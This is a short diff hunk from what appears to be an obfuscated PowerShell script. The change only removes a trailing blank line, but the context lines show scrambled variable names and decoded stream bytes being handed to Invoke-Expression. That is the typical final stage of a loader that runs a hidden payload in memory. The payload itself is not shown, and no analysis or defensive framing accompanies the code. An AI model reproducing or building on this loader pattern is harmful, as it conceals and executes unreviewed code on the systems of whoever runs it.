@@ -16,4 +16,3 @@ $ykpavq.Dispose()
 $mjimmskpy.Close()
 $ovygxus = [System.Text.Encoding]::UTF8.GetString($jcjgyqw.ToArray())
 Invoke-Expression($ovygxus)
-
